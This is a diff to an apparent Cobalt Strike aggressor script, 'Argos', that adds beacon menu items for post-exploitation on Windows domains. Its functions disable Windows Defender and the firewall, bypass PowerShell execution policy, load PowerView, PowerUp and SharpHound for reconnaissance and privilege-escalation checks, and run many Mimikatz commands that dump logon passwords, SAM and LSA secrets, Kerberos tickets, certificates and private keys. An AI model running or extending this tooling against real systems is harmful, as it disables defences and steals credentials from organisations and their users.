@@ -1,41 +1,39 @@
 ## Antivirus functions
 # Disable Windows Defender
 sub disableWindowsDefender {
-    bpowerpick($1, "Set-MpPreference -DisableRealtimeMonitoring $true");
+    bpowershell($1, "powershell -ep bypass");
+    bpowershell($1, "Set-MpPreference -DisableRealtimeMonitoring $true");
 }
 
 # # Disable Windows Defender IOAV
 sub disableWindowsDefenderIOAV {
-    bpowerpick($1, "Set-MpPreference -DisableIOAVprotection $true -Verbose");
+    bpowershell($1, "Set-MpPreference -DisableIOAVprotection $true -Verbose");
 }
 
-# search for a service named “windefend” and return its current state.
-sub getWindowsDefenderStatus {
-    bpowerpick($1, "sc query windefend");
-}
+### Firewall
 
-## Firewall functions
 # Disable Firewall
 sub disableFirewall {
-    bpowerpick($1, "netsh firewall set opmode disable");
+    bpowershell($1, "netsh firewall set opmode disable");
 }
 
 # Show Firewall Status
 sub showFirewallStatus {
-    bpowerpick($1, "netsh firewall show state");
+    bpowershell($1, "netsh firewall show state");
 }
 
 # Show firewall configuration
 sub showFirewallConfig {
-    bpowerpick($1, "netsh firewall show config");
+    bpowershell($1, "netsh firewall show config");
 }
 
-### PowerView functions for Cobalt Strike
-# Function to import POwerView from /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
+### PowerView functions
+# Function to import PowerView from /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
 sub importPowerView {
     local('$beaconId');
     $beaconId = $1;
-    bpowerpick($beaconId, "powershell-import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1");
+    bpowershell($beaconId, "powershell -ep bypass");
+    bpowershell_import($beaconId, "/usr/share/windows-resources/powersploit/Recon/PowerView.ps1");
 }
 
 # Define functions for local admin enumeration
@@ -66,14 +64,6 @@ sub getNetUserExpandSamAccountName {
 
 sub getNetUserDescription {
     bpowerpick($1, "Get-NetUser | select description");
-}
-
-sub findUserFieldPassword {
-    bpowerpick($1, "find-userfield -SearchField description \"password\"");
-}
-
-sub findUserFieldAdmin {
-    bpowerpick($1, "find-userfield -SearchField description \"admin\"");
 }
 
 sub getUserProperty {
@@ -113,28 +103,9 @@ sub getNetComputerCNandOS {
     bpowerpick($1, "Get-NetComputer | Select cn,OperatingSystem");
 }
 
-sub listComputersByOS_Windows7 {
-    bpowerpick($1, "Get-NetComputer -OperatingSystem '*Windows 7'");
-}
-
-sub listComputersByOS_Windows10 {
-    bpowerpick($1, "Get-NetComputer -OperatingSystem '*Windows 10'");
-}
-
-sub listComputersByOS_Server2016 {
-    bpowerpick($1, "Get-NetComputer -OperatingSystem '*server 2016'");
-}
-
-sub listComputersByOS_Server2019 {
-    bpowerpick($1, "Get-NetComputer -OperatingSystem '*server 2019'");
-}
-
 sub listComputerUnconstrainedDelegation {
     bpowerpick($1, "Get-NetComputer -Unconstrained | select -ExpandProperty name");
 }
-
-# Find Servers that has uncontrained delegation
-
 
 # Define functions for share enumeration
 sub invokeEnumerateShares {
@@ -164,7 +135,7 @@ sub invokeFileFinderSelectFullName {
 
 # Define functions for GPO enumeration
 sub enumerateGPOVerbose {
-    bpowerpick($1, "Get-NetGPOGroup -Verbose");
+    bpowerpick($1, "Get-NetGPOGroup");
 }
 
 sub getDomainGPO {
@@ -179,19 +150,236 @@ sub listAllOUs {
     bpowerpick($1, "Get-NetOU");
 }
 
-# Create the Argos submenu with nested submenus for various tasks
+### Bloodhound
+
+sub uploadBloodHound {
+    local('$beaconId');
+    $beaconId = $1;
+    bupload($beaconId, "/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe");
+}
+
+sub ExecuteCollectionMethodAll {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, ".\\SharpHound.exe /all");
+}
+
+### PowerUp functions
+# Invoking
+sub invokePowerUp {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "powershell -ep bypass");
+    bpowershell_import($beaconId, "/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1");
+}
+
+sub invokePowerUpAllChecks {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Invoke-AllChecks");
+}
+
+## Enumerate Service Vulnerabilities
+sub PowerUpModifiableService {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-ModifiableService");
+}
+
+sub PowerUpmodifiableServiceFile {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-ModifiableServiceFile");
+}
+
+sub PowerUpServiceUnquoted {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-ServiceUnquoted");
+}
+
+## RegistryCheck
+sub PowerUpRegistryAlwaysInstallElevated {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-RegistryAlwaysInstallElevated");
+}
+
+sub PowerUpRegistryAutoLogon {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-RegistryAutoLogon");
+}
+
+sub PowerUpRegistryStoredCreds {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-ModifiableRegistryAutoRun");
+}
+
+## Misc
+sub PowerUpUnattendedInstallFile {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-UnattendedInstallFile");
+}
+
+sub PowerUpgetwebconfig {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-WebConfig");
+}
+
+sub PowerUpGet-ProcessTokenPrivilege {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-ProcessTokenPrivilege");
+}
+
+sub PowerUpgetsitelistpassword {
+    local('$beaconId');
+    $beaconId = $1;
+    bpowershell($beaconId, "Get-SiteListPassword");
+}
+
+### Mimikatz functions
+sub mimikatz_debug {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "privilege::debug");
+}
+
+sub token_elevate {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "token::elevate");
+}
+
+sub token_revert {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "token::elevate");
+}
+
+sub mimikatz_sekurlsa_logonpass {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "sekurlsa::logonpasswords");
+}
+
+sub mimikatz_sekurlsa_logpassfull {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "sekurlsa::logonPasswords full");
+}
+
+sub mimikatz_sekurlsa_tickets {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "sekurlsa::tickets /export");
+}
+
+sub crypto_capi {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "crypto::capi");
+}
+
+sub crypto_cng {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "crypto::cng");
+}
+
+sub crypto_certificates_export {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "crypto::certificates /export");
+}
+
+sub crypto_certificates_export_systemstore {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE");
+}
+
+sub crypto_keys_export {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "crypto::keys /export");
+}
+
+sub crypto_keys_export_machine {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "crypto::keys /machine /export");
+}
+
+sub vault {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "vault::cred");
+}
+
+sub vault_list {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "vault::list");
+}
+
+sub lsadump_sam {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "lsadump::sam");
+}
+
+sub lsadump_secrets {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "lsadump::secrets");
+}
+
+sub lsadump_cache {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "lsadump::cache");
+}
+
+sub ekeys {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "sekurlsa::ekeys");
+}
+
+sub dpapi {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "sekurlsa::dpapi");
+}
+
+sub minidump {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "sekurlsa::minidump lsass.dmp");
+}
+
+sub mimi_tgt {
+    local('$beaconId');
+    $beaconId = $1;
+    bmimikatz($beaconId, "kerberos::tgt");
+}
+
+# Argos Menu / Submenu
 popup beacon_top {
     menu "Argos" {
-        menu "Antivirus"{
+        menu "AV" {
             item "Disable Windows Defender" { disableWindowsDefender($1); }
             item "Disable Windows Defender IOAV" { disableWindowsDefenderIOAV($1); }
-            item "Get Windows Defender Status" { getWindowsDefenderStatus($1); }
         }
-        menu "Firewall"{
+        menu Firewall{
             item "Disable Firewall" { disableFirewall($1); }
             item "Show Firewall Status" { showFirewallStatus($1); }
             item "Show Firewall Configuration" { showFirewallConfig($1); }
-
         }
         menu "PowerView" {
             item "Import PowerView" { importPowerView($1); }
@@ -205,8 +393,6 @@ popup beacon_top {
                 item "List usernames (SamAccountName)" { getNetUserSamAccountName($1); }
                 item "List usernames (expanded SamAccountName)" { getNetUserExpandSamAccountName($1); }
                 item "List user descriptions" { getNetUserDescription($1); }
-                item "Search descriptions for 'password'" { findUserFieldPassword($1); }
-                item "Search descriptions for 'admin'" { findUserFieldAdmin($1); }
                 item "Show all user properties" { getUserProperty($1); }
                 item "Show password last set date" { getUserPropertyPwdLastSet($1); }
                 item "Show user login count" { getUserPropertyLogonCount($1); }
@@ -218,10 +404,6 @@ popup beacon_top {
                 item "Get detailed information on all domain computers" { getNetComputerFullData($1); }
                 item "List DNS hostnames of domain computers" { getDomainComputerDnsHostname($1); }
                 item "List computer names and operating systems" { getNetComputerCNandOS($1); }
-                item "List Windows 7 computers" { listComputersByOS_Windows7($1); }
-                item "List Windows 10 computers" { listComputersByOS_Windows10($1); }
-                item "List Windows Server 2016 computers" { listComputersByOS_Server2016($1); }
-                item "List Windows Server 2019 computers" { listComputersByOS_Server2019($1); }
                 item "List computers with unconstrained delegation" { listComputerUnconstrainedDelegation($1); }
             }
             menu "Enumerate Shares" {
@@ -235,10 +417,75 @@ popup beacon_top {
                 item "List full names of found files" { invokeFileFinderSelectFullName($1); }
             }
             menu "GPO Enumeration" {
-                item "Enumerate GPOs (Verbose)" { enumerateGPOVerbose($1); }
+                item "Enumerate GPOs" { enumerateGPOVerbose($1); }
                 item "List the names of the policies" { getDomainGPO($1); }
                 item "List all policies with details" { getNetGPO($1); }
                 item "List all Organization Units" { listAllOUs($1); }
+            }
+        }
+        menu "Bloodhound" {
+            item "Upload BloodHound" { uploadBloodHound($1); }
+            item "Execute Collection Method All" { ExecuteCollectionMethodAll($1); }
+        }
+        menu "PowerUp" {
+            item "Import PowerUp" { invokePowerUp($1); }
+            item "Invoke-AllChecks" { invokePowerUpAllChecks($1); }
+            menu "Enumerate Service Vulnerabilities" {
+                item "Get-ModifiableService" { PowerUpModifiableService($1); }
+                item "Get-ModifiableServiceFile" { PowerUpmodifiableServiceFile($1); }
+                item "Get-ServiceUnquoted" { PowerUpServiceUnquoted($1); }
+            }
+            menu "RegistryCheck" {
+                item "Get-RegistryAlwaysInstallElevated" { PowerUpRegistryAlwaysInstallElevated($1); }
+                item "Get-RegistryAutoLogon" { PowerUpRegistryAutoLogon($1); }
+                item "Get-ModifiableRegistryAutoRun" { PowerUpRegistryStoredCreds($1); }
+            }
+            menu "Misc" {
+                item "Get-UnattendedInstallFile" { PowerUpUnattendedInstallFile($1); }
+                item "Get-WebConfig" { PowerUpgetwebconfig($1); }
+                item "Get-ProcessTokenPrivilege" { PowerUpGet-ProcessTokenPrivilege($1); }
+                item "Get-SiteListPassword" { PowerUpgetsitelistpassword($1); }
+            }
+        }
+        menu "Mimikatz" {
+            item "Privilege::Debug" { mimikatz_debug($1); }
+            menu token {
+                item "token::elevate" { token_elevate($1); }
+                item "token::revert" { token_revert($1); }
+            }
+            menu sekurlsa {
+                item "sekurlsa::logonpasswords" { mimikatz_sekurlsa_logonpass($1); }
+                item "sekurlsa::logonPasswords full" { mimikatz_sekurlsa_logpassfull($1); }
+                item "sekurlsa::tickets /export" { mimikatz_sekurlsa_tickets($1); }
+            }
+            menu crypto {
+                item "crypto::capi" { crypto_capi($1); }
+                item "crypto::cng" { crypto_cng($1); }
+                item "crypto::certificates /export" { crypto_certificates_export($1); }
+                item "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE" { crypto_certificates_export_systemstore($1); }
+                item "crypto::keys /export" { crypto_keys_export($1); }
+                item "crypto::keys /machine /export" { crypto_keys_export_machine($1); }
+            }
+            menu vault {
+                item "vault::cred" { vault($1); }
+                item "vault::list" { vault_list($1); }
+            }
+            menu lsa {
+                item "lsadump::sam" { lsadump_sam($1); }
+                item "lsadump::secrets" { lsadump_secrets($1); }
+                item "lsadump::cache" { lsadump_cache($1); }
+            }
+            menu ekeys {
+                item "sekurlsa::ekeys" { ekeys($1); }
+            }
+            menu dpapi {
+                item "sekurlsa::dpapi" { dpapi($1); }
+            }
+            menu minidump {
+                item "sekurlsa::minidump lsass.dmp" { minidump($1); }
+            }
+            menu tgt {
+                item "kerberos::tgt" { mimi_tgt($1); }
             }
         }
     }
